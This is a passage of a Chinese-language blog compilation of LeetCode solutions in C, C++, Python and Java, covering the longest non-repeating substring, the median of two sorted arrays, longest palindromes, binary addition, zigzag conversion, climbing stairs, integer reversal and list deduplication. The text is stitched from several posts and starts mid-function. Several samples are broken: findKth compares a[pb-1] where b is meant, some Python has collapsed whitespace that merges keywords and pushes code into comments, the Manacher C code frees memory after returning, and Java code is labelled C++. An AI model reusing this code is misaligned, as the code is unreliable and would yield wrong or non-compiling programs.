            if (dict[s[i]] > start)
                start = dict[s[i]];
            dict[s[i]] = i;
            maxLen = max(maxLen, i - start);
        }
        return maxLen;
    }


/**
 * Solution (DP, O(n)):
 *
 * Assume L[i] = s[m...i], denotes the longest substring without repeating
 * characters that ends up at s[i], and we keep a hashmap for every
 * characters between m ... i, while storing <character, index> in the
 * hashmap.
 * We know that each character will appear only once.
 * Then to find s[i+1]:
 * 1) if s[i+1] does not appear in hashmap
 *    we can just add s[i+1] to hash map. and L[i+1] = s[m...i+1]
 * 2) if s[i+1] exists in hashmap, and the hashmap value (the index) is k
 *    let m = max(m, k), then L[i+1] = s[m...i+1], we also need to update
 *    entry in hashmap to mark the latest occurency of s[i+1].
 *
 * Since we scan the string for only once, and the 'm' will also move from
 * beginning to end for at most once. Overall complexity is O(n).
 *
 * If characters are all in ASCII, we could use array to mimic hashmap.
 */

int lengthOfLongestSubstring(string s) {
    // for ASCII char sequence, use this as a hashmap
    vector<int> charIndex(256, -1);
    int longest = 0, m = 0;

    for (int i = 0; i < s.length(); i++) {
        m = max(charIndex[s[i]] + 1, m);    // automatically takes care of -1 case
        charIndex[s[i]] = i;
        longest = max(longest, i - m + 1);
    }

    return longest;
}


下面给出python代码：

class Solution:
    # @return an integer
    def lengthOfLongestSubstring(self, s):
        start = maxLength = 0
        usedChar = {}

        for i in range(len(s)):
            if s[i] in usedChar and start <= usedChar[s[i]]:
                start = usedChar[s[i]] + 1
            else:
                maxLength = max(maxLength, i - start + 1)

            usedChar[s[i]] = i

        return maxLength下面是c语言的版本：



// testlongsetString.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <stdio.h>
#include<iostream>

using namespace std;

void GetMaxUnRepeatSubStr(char *str)
{
	//global var
	int hashTable[256] ={0};
	char* pMS = str;
	int mLen = 0;

	//temp var
	char* pStart = pMS;
	int len = mLen;
	char* p = pStart;
	while(*p != '\0')
	{
		if(hashTable[*p] == 1)
		{
			if(len > mLen)
			{
				pMS = pStart;
				mLen = len;
			}

			while(*pStart != *p)
			{
				hashTable[*pStart] = 0;
				pStart++;
				len--;
			}
			pStart++;
		}
		else
		{
			hashTable[*p] = 1;
			len++;
		}
		p++;
	}
	// check the last time
	if(len > mLen)
	{
		pMS = pStart;
		mLen = len;
	}
	//print the longest substring
	while(mLen>0)
	{
		cout<<*pMS<<" ";
		mLen--;
		pMS++;
	}
	cout<<endl;
}

int main()
{
	char* str1="bdabcdcf";
	GetMaxUnRepeatSubStr(str1);
	char* str2="abcdefb";
	GetMaxUnRepeatSubStr(str2);
	char* str3="abcbef";
	GetMaxUnRepeatSubStr(str3);

	return 0;
}参考文献：


http://bbs.csdn.net/topics/310174805



http://www.cnblogs.com/luxiaoxun/archive/2012/10/02/2710471.html



http://dsqiu.iteye.com/blog/1701324




http://www.ahathinking.com/archives/123.html










4. Median of Two Sorted Arrays Total Accepted: 99662     Total Submissions: 523759 Difficulty: HardThere are two sorted arrays nums1 and nums2 of size m and n respectively.Find the median of the two sorted arrays. The overall run time complexity should be O(log (m+n)).Example 1:nums1 = [1, 3]nums2 = [2]The median is 2.0Example 2:nums1 = [1, 2]nums2 = [3, 4]The median is (2 + 3)/2 = 2.5方案0：合并两个数组为一个数组，排序，取第k个class Solution {
public:
    double findMedianSortedArrays(vector<int>& nums1, vector<int>& nums2)
    {
        
        // Start typing your C/C++ solution below
        // DO NOT write int main() function
        int m = nums1.size();
        int n = nums2.size();
        vector<int>   v;   
		v.insert(v.end(),   nums1.begin(),   nums1.end());   
		v.insert(v.end(),   nums2.begin(),   nums2.end()); 
		
        
        
        sort(v.begin(),v.end());
        
        double median=(double) ((n+m)%2? v[(n+m)/2]:(v[(n+m-1)/2]+v[(n+m)/2])/2.0);
        
        
        
        return median;
    }
};方案1：假设两个数组总共有n个元素，用merge sort的思路排序，排序好的数组取出下标为k-1的元素就是我们需要的答案。这个方法比较容易想到，但是有没有更好的方法呢？方案2：可以用一个计数器，记录当前已经找到第m大的元素。同时我们使用两个指针pA和pB，分别指向A和B数组的第一个元素。使用类似于merge sort的原理，如果数组A当前元素小，那么pA++，同时m++。如果数组B当前元素小，那么pB++，同时m++。最终当m等于k的时候，就得到了我们的答案——O(k)时间，O(1)空间。但是，当k很接近于n的时候，这个方法还是很费时间的。当然，我们可以判断一下，如果k比n/2大的话，我们可以从最大的元素开始找。但是如果我们要找所有元素的中位数呢？时间还是O(n/2)=O(n)的。有没有更好的方案呢？我们可以考虑从k入手。如果我们每次都能够剔除一个一定在第k大元素之前的元素，那么我们需要进行k次。但是如果每次我们都剔除一半呢？所以用这种类似于二分的思想，我们可以这样考虑：Assume that the number of elements in A and B are both larger than k/2, and if we compare the k/2-th smallest element in A(i.e. A[k/2-1]) and the k-th smallest element in B(i.e. B[k/2 - 1]), there are three results:(Becasue k can be odd or even number, so we assume k is even number here for simplicy. The following is also true when k is an odd number.)A[k/2-1] = B[k/2-1]A[k/2-1] > B[k/2-1]A[k/2-1] < B[k/2-1]if A[k/2-1] < B[k/2-1], that means all the elements from A[0] to A[k/2-1](i.e. the k/2 smallest elements in A) are in the range of k smallest elements in the union of A and B. Or, in the other word, A[k/2 - 1] can never be larger than the k-th smalleset element in the union of A and B.Why?We can use a proof by contradiction. Since A[k/2 - 1] is larger than the k-th smallest element in the union of A and B, then we assume it is the (k+1)-th smallest one. Since it is smaller than B[k/2 - 1], then B[k/2 - 1] should be at least the (k+2)-th smallest one. So there are at most (k/2-1) elements smaller than A[k/2-1] in A, and at most (k/2 - 1) elements smaller than A[k/2-1] in B.So the total number is k/2+k/2-2, which, no matter when k is odd or even, is surly smaller than k(since A[k/2-1] is the (k+1)-th smallest element). So A[k/2-1] can never larger than the k-th smallest element in the union of A and B if A[k/2-1]<B[k/2-1];Since there is such an important conclusion, we can safely drop the first k/2 element in A, which are definitaly smaller than k-th element in the union of A and B. This is also true for the A[k/2-1] > B[k/2-1] condition, which we should drop the elements in B.When A[k/2-1] = B[k/2-1], then we have found the k-th smallest element, that is the equal element, we can call it m. There are each (k/2-1) numbers smaller than m in A and B, so m must be the k-th smallest number. So we can call a function recursively, when A[k/2-1] < B[k/2-1], we drop the elements in A, else we drop the elements in B.We should also consider the edge case, that is, when should we stop?1. When A or B is empty, we return B[k-1]( or A[k-1]), respectively;2. When k is 1(when A and B are both not empty), we return the smaller one of A[0] and B[0]3. When A[k/2-1] = B[k/2-1], we should return one of themIn the code, we check if m is larger than n to garentee that the we always know the smaller array, for coding simplicy.中文翻译：该方法的核心是将原问题转变成一个寻找第k小数的问题（假设两个原序列升序排列），这样中位数实际上是第(m+n)/2小的数。所以只要解决了第k小数的问题，原问题也得以解决。首先假设数组A和B的元素个数都大于k/2，我们比较A[k/2-1]和B[k/2-1]两个元素，这两个元素分别表示A的第k/2小的元素和B的第k/2小的元素。这两个元素比较共有三种情况：>、<和=。如果A[k/2-1]<B[k/2-1]，这表示A[0]到A[k/2-1]的元素都在A和B合并之后的前k小的元素中。换句话说，A[k/2-1]不可能大于两数组合并之后的第k小值，所以我们可以将其抛弃。证明也很简单，可以采用反证法。假设A[k/2-1]大于合并之后的第k小值，我们不妨假定其为第（k+1）小值。由于A[k/2-1]小于B[k/2-1]，所以B[k/2-1]至少是第（k+2）小值。但实际上，在A中至多存在k/2-1个元素小于A[k/2-1]，B中也至多存在k/2-1个元素小于A[k/2-1]，所以小于A[k/2-1]的元素个数至多有k/2+ k/2-2，小于k，这与A[k/2-1]是第（k+1）的数矛盾。当A[k/2-1]>B[k/2-1]时存在类似的结论。当A[k/2-1]=B[k/2-1]时，我们已经找到了第k小的数，也即这个相等的元素，我们将其记为m。由于在A和B中分别有k/2-1个元素小于m，所以m即是第k小的数。(这里可能有人会有疑问，如果k为奇数，则m不是中位数。这里是进行了理想化考虑，在实际代码中略有不同，是先求k/2，然后利用k-k/2获得另一个数。)通过上面的分析，我们即可以采用递归的方式实现寻找第k小的数。此外我们还需要考虑几个边界条件：如果A或者B为空，则直接返回B[k-1]或者A[k-1]；如果k为1，我们只需要返回A[0]和B[0]中的较小值；如果A[k/2-1]=B[k/2-1]，返回其中一个；// leetcode4.cpp : 定义控制台应用程序的入口点。
//


#include "stdafx.h"

#define min(x,y) (x>y?y:x)
#define max(x,y) (x>y?x:y)

double findKth(int a[],int m,int b[],int n,int k)
{
	if (m>n)
		return findKth(b,n,a,m,k);
	if(m == 0)
		return b[k-1];
	if(k ==1)
		return min(a[0],b[0]);

	//divide k into two parts;
	int pa = min(k/2,m),pb = k - pa;
	if (a[pa -1]<b[pb - 1])
		return findKth(a +pa,m-pa,b,n,k-pa);
	else if(a[pa -1]>a[pb-1])
		return findKth(a,m,b+pb,n-pb,k-pb);
	else
		return a[pa -1];

}

double findMedianSortedArrays(int A[],int m,int B[],int n)
{
	int total = m +n;
	if (total&0x1)
		return findKth(A,m,B,n,total/2+1);
	else
		return (findKth(A,m,B,n,total/2)+findKth(A,m,B,n,total/2+1))/2;
}
int _tmain(int argc, _TCHAR* argv[])
{
	int a[]={1,2,3};
	int b[]={555,666,999};
	int result = findMedianSortedArrays(a,3,b,3);
	return 0;
}

python解决方案：基本上和c++比较类似def findMedianSortedArrays(self, A, B):
    l = len(A) + len(B)
    if l % 2 == 1:
        return self.kth(A, B, l // 2)
    else:
        return (self.kth(A, B, l // 2) + self.kth(A, B, l // 2 - 1)) / 2.defkth(self, a, b, k):ifnot a:
        return b[k]
    ifnot b:
        return a[k]
    ia, ib = len(a) // 2 , len(b) // 2
    ma, mb = a[ia], b[ib]

    # when k is bigger than the sum of a and b's median indices if ia + ib < k:
        # if a's median is bigger than b's, b's first half doesn't include kif ma > mb:
            return self.kth(a, b[ib + 1:], k - ib - 1)
        else:
            return self.kth(a[ia + 1:], b, k - ia - 1)
    # when k is smaller than the sum of a and b's indiceselse:
        # if a's median is bigger than b's, a's second half doesn't include kif ma > mb:
            return self.kth(a[:ia], b, k)
        else:
            return self.kth(a, b[:ib], k)参考文献：http://blog.csdn.net/zxzxy1988/article/details/8587244http://blog.csdn.net/yutianzuijin/article/details/11499917网上看到了一张leetcode 的难度和考试频率分析表，转过来给大家看看，出现频率为5的题目还是背诵并默写吧，哈哈！       1Two Sum25arraysort    setTwo Pointers2Add Two Numbers34linked listTwo Pointers     Math3Longest Substring Without Repeating Characters32stringTwo Pointers    hashtable 4Median of Two Sorted Arrays53arrayBinary Search5Longest Palindromic Substring42string 6ZigZag Conversion31string 7Reverse Integer23 Math8String to Integer (atoi)25stringMath9Palindrome Number22 Math10Regular Expression Matching53stringRecursion     DP11Container With Most Water32arrayTwo Pointers12Integer to Roman34 Math13Roman to Integer24 Math14Longest Common Prefix21string 153Sum35arrayTwo Pointers163Sum Closest31arrayTwo Pointers17Letter Combinations of a Phone Number33stringDFS184Sum32array 19Remove Nth Node From End of List23linked listTwo Pointers20Valid Parentheses25stringStack21Merge Two Sorted Lists25linked listsort     Two Pointers     merge22Generate Parentheses34stringDFS23Merge k Sorted Lists34linked listsort    heapTwo Pointers     merge24Swap Nodes in Pairs24linked list 25Reverse Nodes in k-Group42linked listRecursion     Two Pointers26Remove Duplicates from Sorted Array13arrayTwo Pointers27Remove Element14arrayTwo Pointers28Implement strStr()45stringTwo Pointers     KMP     rolling hash29Divide Two Integers43 Binary Search     Math30Substring with Concatenation of All Words31stringTwo Pointers31Next Permutation52arraypermutation32Longest Valid Parentheses41stringDP33Search in Rotated Sorted Array43arrayBinary Search34Search for a Range43arrayBinary Search35Search Insert Position22array 36Valid Sudoku22array 37Sudoku Solver42arrayDFS38Count and Say22stringTwo Pointers39Combination Sum33arraycombination40Combination Sum II42arraycombination41First Missing Positive52arraysort42Trapping Rain Water42arrayTwo Pointers     Stack43Multiply Strings43stringTwo Pointers     Math44Wildcard Matching53stringRecursion     DP     greedy45Jump Game II42array 46Permutations34arraypermutation47Permutations II42arraypermutation48Rotate Image42array 49Anagrams34string     hashtable 50Pow(x, n)35 Binary Search     Math51N-Queens43arrayDFS52N-Queens II43arrayDFS53Maximum Subarray33arrayDP54Spiral Matrix42array 55Jump Game32array 56Merge Intervals45arraysort    linked listmerge    red-black tree 57Insert Interval45arraysort    linked listmerge    red-black tree 58Length of Last Word11string 59Spiral Matrix II32array 60Permutation Sequence51 permutation     Math61Rotate List32linked listTwo Pointers62Unique Paths23arrayDP63Unique Paths II33arrayDP64Minimum Path Sum33arrayDP65Valid Number25stringMath66Plus One12arrayMath67Add Binary24stringTwo Pointers     Math68Text Justification42string 69Sqrt(x)44 Binary Search70Climbing Stairs25 DP71Simplify Path31stringStack72Edit Distance43stringDP73Set Matrix Zeroes35array 74Search a 2D Matrix33arrayBinary Search75Sort Colors42arraysort     Two Pointers76Minimum Window Substring42stringTwo Pointers77Combinations34 combination78Subsets34arrayRecursion     combination79Word Search34arrayDFS80Remove Duplicates from Sorted Array II22arrayTwo Pointers81Search in Rotated Sorted Array II53arrayBinary Search82Remove Duplicates from Sorted List II33linked listRecursion     Two Pointers83Remove Duplicates from Sorted List13linked list 84Largest Rectangle in Histogram52arrayStack85Maximal Rectangle51arrayDP     Stack86Partition List33linked listTwo Pointers87Scramble String52stringRecursion     DP88Merge Sorted Array25arrayTwo Pointers     merge89Gray Code42 combination90Subsets II42arrayRecursion     combination91Decode Ways34stringRecursion     DP92Reverse Linked List II32linked listTwo Pointers93Restore IP Addresses33stringDFS94Binary Tree Inorder Traversal43treeRecursion    hashtablemorris     Stack95Unique Binary Search Trees II41treeDP     DFS96Unique Binary Search Trees31treeDP97Interleaving String52stringRecursion     DP98Validate Binary Search Tree35treeDFS99Recover Binary Search Tree42treeDFS100Same Tree11treeDFS101Symmetric Tree12treeDFS102Binary Tree Level Order Traversal34treeBFS103Binary Tree Zigzag Level Order Traversal43queueBFS    treeStack104Maximum Depth of Binary Tree11treeDFS105Construct Binary Tree from Preorder and Inorder Tr33arrayDFS    tree 106Construct Binary Tree from Inorder and Postorder T33arrayDFS    tree 107Binary Tree Level Order Traversal II31treeBFS108Convert Sorted Array to Binary Search Tree23treeDFS109Convert Sorted List to Binary Search Tree43linked listRecursion     Two Pointers110Balanced Binary Tree12treeDFS111Minimum Depth of Binary Tree11treeDFS112Path Sum13treeDFS113Path Sum II22treeDFS114Flatten Binary Tree to Linked List33treeRecursion     Stack115Distinct Subsequences42stringDP116Populating Next Right Pointers in Each Node33treeDFS117Populating Next Right Pointers in Each Node II42treeDFS118Pascal's Triangle21array 119Pascal's Triangle II21array 120Triangle31arrayDP121Best Time to Buy and Sell Stock21arrayDP122Best Time to Buy and Sell Stock II31arraygreedy123Best Time to Buy and Sell Stock III41arrayDP124Binary Tree Maximum Path Sum42treeDFS125Valid Palindrome25stringTwo Pointers126Word Ladder II11  127Word Ladder35graphBFS     shortest path128Longest Consecutive Sequence43array 129Sum Root to Leaf Numbers24treeDFS130Surrounded Regions43arrayBFS     DFS131Palindrome Partitioning34stringDFS132Palindrome Partitioning II43stringDP 








问题描述
Given a string S, find the longest palindromic substring in S. You may assume that the maximum length of S is 1000, and there exists one unique longest palindromic substring. 
所谓回文字符串，就是一个字符串，从左到右读和从右到左读是完全一样的。比如”a” , “aaabbaaa”
之前去笔试了三星研究院，写算法题的时候限定了编程语言只能使用的头文件和库函数，这在很大程度上考察了一个程序员的单位时间生产力。比如java只能用util包，c/c++语言只能包含以下三个头文件: 
stdio.h 
malloc.h  //ANSI标准建议使用stdlib.h头文件 
iostream.h // 非标准输入输出，不需要命名空间
所以我想，针对这种高标准的要求，以后做leetcode系列时应该写三个版本，c语言版本不使用库函数，c++版本使用STL，python版本
解决方案
1.暴力方案(Brute Force)
对于字符串的每一个子串，都判断一下是不是回文字符串，完后返回最长的那一个 
(Brute Force) [Time Limit Exceeded] 
时间复杂度分析：O（n3），空间复杂度O（n）,显然超时了。
#include "stdafx.h"
#include <iostream>
#include <string>
using namespace std;
char result[1000]={0};

bool isHuiwen(int begin,int end,char* s)
{
    if (end==begin||end<begin)
    {
        return true;
    }
    if (s[begin]!=s[end])
    {
        return false;
    }
    return isHuiwen(begin+1,end-1,s);
}

char* longestHuiwen(int length,char* s)
{
    int begin = 0,end=0,sum=0;
    for (int i=0;i<length;i++)
    {
        for (int j=0;j<=i;j++)
        {
            if (isHuiwen(j,i,s))
            {
                if (i-j>=sum)
                {
                    sum = i -j;
                    begin = j;
                    end = i;
                }

            }

        }
    }
    strncpy(result,s+begin,sum+1);//由0开始计数
    return result;
}

int _tmain(int argc, _TCHAR* argv[])
{
    char* s = "abcabaaaabbacabbaa";
    char* r_s = longestHuiwen(18,s);
    return 0;
}
2.问题转换为求最长相似子串
Approach #1 (Longest Common Substring) [Accepted]
Common mistake
Some people will be tempted to come up with a quick solution, which is unfortunately flawed (however can be corrected easily):
Reverse S and become S′.  
Find the longest common substring between S and S​′, which must also be the longest palindromic substring.This seemed to work, let’s see some examples below.
For example,  
S=”caba” 
S′=”abac”
The longest common substring between S and S​′ is ”aba”, which is the answer. 
Let’s try another example:  
S=”abacdfgdcaba” 
S′=”abacdgfdcaba”
The longest common substring between S and S​′ is ”abacd” 
 Clearly, this is not a valid palindrome.
讨论帖子： http://bbs.csdn.net/topics/392005408
其他三种解法
Approach #3 (Dynamic Programming) [Accepted]
To improve over the brute force solution, we first observe how we can avoid unnecessary re-computation while validating palindromes. Consider the case  
”ababa” 
”ababa”. If we already knew that  
”bab” 
”bab” is a palindrome, it is obvious that  
”ababa” 
”ababa” must be a palindrome since the two left and right end letters are the same.
We define P(i,j)P(i,j) as following:
P(i,j)={true, 
if the substring Si…Sj is a palindrome 
false, 
otherwise.
P(i,j)={true,if the substring Si…Sj is a palindromefalse,otherwise.  
Therefore,
P(i, j) = ( P(i+1, j-1) \text{ and } S_i == S_j ) P(i,j)=(P(i+1,j−1) and S​i==S​j)
The base cases are:
P(i, i) = true P(i,i)=true
P(i, i+1) = ( S_i == S_{i+1} ) P(i,i+1)=(S​i ==Si+1)
This yields a straight forward DP solution, which we first initialize the one and two letters palindromes, and work our way up finding all three letters palindromes, and so on…
Complexity Analysis
Time complexity : O(n^2)O(n​2). This gives us a runtime complexity of O(n^2)O(n2).
Space complexity : O(n^2)O(n​2). It uses O(n^2)O(n2) space to store the table.
Additional Exercise
Could you improve the above space complexity further and how?
Approach #4 (Expand Around Center) [Accepted]
In fact, we could solve it in O(n^2)O(n​2 ) time using only constant space.
We observe that a palindrome mirrors around its center. Therefore, a palindrome can be expanded from its center, and there are only 2n - 12n−1 such centers.
You might be asking why there are 2n - 12n−1 but not nn centers? The reason is the center of a palindrome can be in between two letters. Such palindromes have even number of letters (such as  
”abba””abba”) and its center are between the two ‘b”b’s.
public String longestPalindrome(String s) { 
    int start = 0, end = 0; 
    for (int i = 0; i < s.length(); i++) { 
        int len1 = expandAroundCenter(s, i, i); 
        int len2 = expandAroundCenter(s, i, i + 1); 
        int len = Math.max(len1, len2); 
        if (len > end - start) { 
            start = i - (len - 1) / 2; 
            end = i + len / 2; 
        } 
    } 
    return s.substring(start, end + 1); 
}
private int expandAroundCenter(String s, int left, int right) { 
    int L = left, R = right; 
    while (L >= 0 && R < s.length() && s.charAt(L) == s.charAt(R)) { 
        L–; 
        R++; 
    } 
    return R - L - 1; 
} 
Complexity Analysis
Time complexity : O(n^2)O(n​2​​ ). Since expanding a palindrome around its center could take O(n)O(n) time, the overall complexity is O(n^2)O(n​2​​ ).
Space complexity : O(1)O(1).
Approach #5 (Manacher’s Algorithm) [Accepted]
There is even an O(n)O(n) algorithm called Manacher’s algorithm, explained here in detail. However, it is a non-trivial algorithm, and no one expects you to come up with this algorithm in a 45 minutes coding session. But, please go ahead and understand it, I promise it will be a lot of fun.
参考代码
c代码
char* longestPalindrome(char* s) {
int i,length=strlen(s);
char* new_s;
new_s=malloc(sizeof(char)*(2*length + 2));
new_s[0]='$';
new_s[1]='#';

for(i=0;i<length;i++)
{
    *(new_s+2*i+2)=s[i];
    *(new_s+2*i+3)='#';

}
int len=2*length + 2;
int* r;
r=malloc(sizeof(int)*len);
r[0]=0;
int center=1;
int max_right=0;
for(i=1;i<len;i++)
{
if(i<max_right)
{
   if( (max_right-i)> r[2*center-i] )
   r[i]=r[2*center-i];
   else
   r[i]=(max_right-i);
}
else r[i]=1;
while(new_s[i-r[i]]==new_s[i+r[i]] && i-r[i]>0 && i+r[i]<len)
    {
        r[i]++;
    }

if(i+r[i] > max_right)
        { 
        center = i;
        max_right = i+r[i];

        } 

}
int max_r = 0;
int j=0;
for(i=1;i<len;i++)
    {
        if( max_r<r[i])
        {   
            j=i;
            max_r= r[i];
        }
    }
int m=(j-(max_r-2)-2)/2;
int n=(j+(max_r-2)-2)/2;
char *c;
    c=malloc((max_r)*sizeof(char));

int x=0;
for(i=m;i<=n,x<max_r-1;i++)
{
    c[x]=s[i];
    x++;
}
*(c+max_r-1)='\0';
return c;
free(r);
free(new_s);
free(c);

}


c++代码
string longestPalindrome(string s) {
    if (s.empty()) return"";
    if (s.size() == 1) return s;
    int min_start = 0, max_len = 1;
    for (int i = 0; i < s.size();) {
      if (s.size() - i <= max_len / 2) break;
      int j = i, k = i;
      while (k < s.size()-1 && s[k+1] == s[k]) ++k; // Skip duplicate characters.
      i = k+1;
      while (k < s.size()-1 && j > 0 && s[k + 1] == s[j - 1]) { ++k; --j; } // Expand.int new_len = k - j + 1;
      if (new_len > max_len) { min_start = j; max_len = new_len; }
    }
    return s.substr(min_start, max_len);
}
python参考代码

def longestPalindrome(self, s):
    res = ""
    for i in xrange(len(s)):
        # odd case, like "aba"
        tmp = self.helper(s, i, i)
        if len(tmp) > len(res):
            res = tmp
        # even case, like "abba"
        tmp = self.helper(s, i, i+1)
        if len(tmp) > len(res):
            res = tmp
    return res

# get the longest palindrome, l, r are the middle indexes  
# from inner to outer
def helper(self, s, l, r):
    while l >= 0 and r < len(s) and s[l] == s[r]:
        l -= 1; r += 1
    return s[l+1:r]
参考文献

http://articles.leetcode.com/longest-palindromic-substring-part-ii/
https://www.felix021.com/blog/read.php?2040
https://leetcode.com/articles/longest-palindromic-substring/
 






Add Binary 
Total Accepted: 46815 
Total Submissions: 189215 
My Submissions 
                      




Given two binary strings, return their sum (also a binary string). 
For example,
a = "11"
b = "1"
Return "100". 





我的解决方案：
class Solution {
public:
    string addBinary(string a, string b) 
    {
        
        string result = "";
        int c = 0;
        int i = a.size() - 1;
        int j = b.size() - 1;
        
        while(i >= 0 || j >=0 ||c ==1)
        {
            c += i >= 0 ? a[i--] - '0':0;
            c += j >= 0 ? b[j--] - '0':0;
            result = char( c% 2 + '0') + result;
            c /= 2;
            
        }
        
        return result;
        
        
    }
};

c语言解决方案：
char* addBinary(char* a, char* b) {
    int n, m;
    for (n=0; *a; a++, n++) ;
    for (m=0; *b; b++, m++) ;
    char *p = (char*)malloc(m>n ? m+2 : n+2), *last = p;
    int c = 0;
    while (n || m || c) {
        int s = c;
        if (n) {
            s += *(--a)-'0';
            --n;
        }
        if (m) {
            s += *(--b)-'0';
            --m;
        }
        *last++ = (s&1)+'0';
        c = s>>1;
    }
    *last=0;
    char *start = p, t;
    while (start+1 < last) { // reverse string
        t = *start;
        *start++=*(--last);
        *last=t;
    }
    return p;
}数字电路版本代码：加法器的实现https://leetcode.com/discuss/40846/c-4ms-solution-inspired-by-hardware-full-adder-circuit



python 的三个版本：

class Solution:
    # @param {string} a
    # @param {string} b
    # @return {string}
    def addBinary(self, a, b):
        i, m, n, result, carry = 1, len(a), len(b), [], 0
        while i <= m or i <= n:
            temp = carry
            if i <= m:
                temp += int(a[-i])
            if i <= n:
                temp += int(b[-i])

            carry = temp / 2
            result.append(str(temp % 2))
            i += 1

        if carry:
            result.append(str(carry))

        return ''.join(result[::-1])

or a really short one if you want

class Solution:
    # @param {string} a
    # @param {string} b
    # @return {string}
    def addBinary(self, a, b):
        return '{0:b}'.format(int(a, 2) + int(b, 2))


class Solution:
    # @param {string} a
    # @param {string} b
    # @return {string}
    def addBinary(self, a, b):
        return bin(int(a,2) + int(b,2))[2:]

﻿﻿









The string “PAYPALISHIRING” is written in a zigzag pattern on a given number of rows like this: (you may want to display this pattern in a fixed font for better legibility)  
P—–A—–H—–N 
A–P–L–S–I—I–G 
Y——I—–R
And then read line by line: “PAHNAPLSIIGYIR”
Write the code that will take a string and make this conversion given a number of rows:  
string convert(string text, int nRows); 
convert(“PAYPALISHIRING”, 3) should return “PAHNAPLSIIGYIR”. 
解决方案： 
The idea is, the first row and last row has no offset. Each element has a fixed difference of 2(nRows-1); For the rows in between, there is a incremental offset of 2;
0       6       12    -> distance = 2(nRows-1) = 6 offset = 0 
1    5  7     11        -> offset =  distance - 2 = 4 
2  4    8  10            -> offset = distance -2 -2 = 2 
3       9                  -> distance = 2(nRows-1) = 6 offset = 0
Easy to observe. There is a catch, that you need to add the offset element with previous regular element. 5 follows 1, 4 follows 2. Otherwise, you will miss the tail if there is no vertical column in the end.Looks like a CS homework:)
class Solution {
public:
    string convert(string s, int nRows) {
        if(s.length() == 0 || 
            s.length()/nRows < 1 ||
            nRows == 1) 
        {
            return s;
        }
        int distance = 2*(nRows-1);
        string result;
        int offset = 0;
        for (int row = 0; row < nRows; row++)
        {
            for (int index = row; index < s.length(); index += distance)
            {
                result+=s[index];
                if (offset != 0 && index + distance - offset < s.length())
                {
                    result+=s[index + distance - offset];
                }
            }
            offset += 2;
            offset = offset % distance;
        }
        return result;
    }
};

解决方案2： 
 
The problem statement itself is unclear for many. Especially for 2-row case. “ABCD”, 2 –> “ACBD”. The confusion most likely is from the character placement. I would like to extend it a little bit to make ZigZag easy understood.
The example can be written as follow: 
1.P…….A……..H…….N 
2…A..P….L..S….I…I….G 
3…..Y………I……..R
Therefore, 
class Solution {
public:
    string convert(string s, int numRows)
    {


    if (numRows <= 1)
        return s;

    const int len = (int)s.length();
    string *str = new string[numRows];

    int row = 0, step = 1;
    for (int i = 0; i < len; ++i)
    {
        str[row].push_back(s[i]);

        if (row == 0)
            step = 1;
        else if (row == numRows - 1)
            step = -1;

        row += step;
    }

    s.clear();
    for (int j = 0; j < numRows; ++j)
    {
        s.append(str[j]);
    }

    delete[] str;
    return s;
}
};
python解决方案： 
The idea is to use the remainder (index%period) to determine which line the character at the given index will be. The period is calculated first based on nRows. A dictionary with remainder:line as key:value is then created (this can also be done with a list or a tuple). Once these are done, we simply go through s, assign each character to its new line, and then combine these lines to get the converted string.
The code may be further shortened by using dict comprehension: 
d={i:i if i
def convert(self, s, nRows):
    if nRows==1:
        return s
    period= 2*(nRows -1)
    lines=["" for i in range(nRows)]
    d={} # dict remainder:line
    for i in xrange(period):
        if i<nRows:
            d[i]=i
        else:
            d[i]=period-i

    for i in xrange(len(s)):
        lines[ d[i%period] ] +=s[i]

    return "".join(lines)
 






﻿﻿
Climbing Stairs
                      



You are climbing a stair case. It takes n steps to reach to the top.
Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top?

Hide Tags
Dynamic Programming



这个题面试题还是比较常见的
讨论的帖子：
https://leetcode.com/discuss/2809/easy-solutions-for-suggestions


原理：

This problem is a Fibonacci problem. F(n)=F(n-1)+F(n-2); Solving this problem by recursion ,we will do a lot of same recursion. Example: F(10)=F(9)+F(8); F(9)=F(8)+F(7); we calculate F(8) twice,when n is large,this will increase as a rate of n's exponent.
So a more efficient way to solve this problem is from Bottom to Top. Calculate F(0) ,F(1); then F(2).........







人生ac最快的代码：
class Solution {
public:
    int climbStairs(int n)
    {
        
        int stepone = 0;
        int steptwo = 1;
        int sum = 0;
        
        for(int i = 0;i<n;i++)
        {
            sum = stepone + steptwo;
            stepone = steptwo;
            steptwo = sum;
            
            
        }
        
        return sum;
    }
};



DP算法求解：
https://leetcode.com/discuss/16275/my-dp-solution-using-c-4-ms

简洁的代码：
https://leetcode.com/discuss/31848/1ms-in-c-and-2ms-in-c-optimal-space-no-temp-value

递归：
https://leetcode.com/discuss/28383/simple-and-clear-2ms-solution-in-c-without-recursion

python：

https://leetcode.com/discuss/25378/this-is-essentially-a-fibonacci-sequence


﻿﻿









Reverse digits of an integer.
Example1: x = 123, return 321 
Example2: x = -123, return -321 
click to show spoilers.
Have you thought about this?  
Here are some good questions to ask before coding. Bonus points for you if you have already thought through this!
If the integer’s last digit is 0, what should the output be? ie, cases such as 10, 100.
Did you notice that the reversed integer might overflow? Assume the input is a 32-bit integer, then the reverse of 1000000003 overflows. How should you handle such cases?
For the purpose of this problem, assume that your function returns 0 when the reversed integer overflows.
Update (2014-11-10): 
 Test cases had been added to test the overflow behavior. 
非常优雅的解决方案：

class Solution {
public:
  int reverse(int x) 
{
    static const int overflow = INT_MAX/10;
    const int mod = x>0 ? 10 : -10;
    int r = 0;


    while(x)
    {
        if(r > overflow || r < -overflow)
            return 0;

        r = (x % mod) + r * 10;
        x = x / 10;
    }

    return r;


}

}; 









Given a sorted linked list, delete all duplicates such that each element appear only once. 
For example, 
 Given 1->1->2, return 1->2. 
 Given 1->1->2->3->3, return 1->2->3.  

下面是我的解决方案，考虑测试用例： 
1，1 
1，1，1 
1，2，2
/**
 * Definition for singly-linked list.
 * struct ListNode {
 *     int val;
 *     ListNode *next;
 *     ListNode(int x) : val(x), next(NULL) {}
 * };
 */
class Solution {
public:
    ListNode* deleteDuplicates(ListNode* head)
    {
        if(head==NULL)return head;

        ListNode* pre = head;
        ListNode* cur = head->next;

        while(cur!=NULL)
        {
            if(cur->val==pre->val)
            {
                pre->next = pre->next->next;
                cur = cur->next;
                if(cur==NULL)return head;
                //free(cur)没有free是不对的，可能引起内存泄漏;
            }
            else if(cur->val!=pre->val)
            {
                pre = pre->next;
                cur = cur->next;
            }

        }
        return head;

    }
};
c++：
public class Solution {
    public ListNode deleteDuplicates(ListNode head) {
        if (head == null) return head;

        ListNode cur = head;
        while(cur.next != null) {
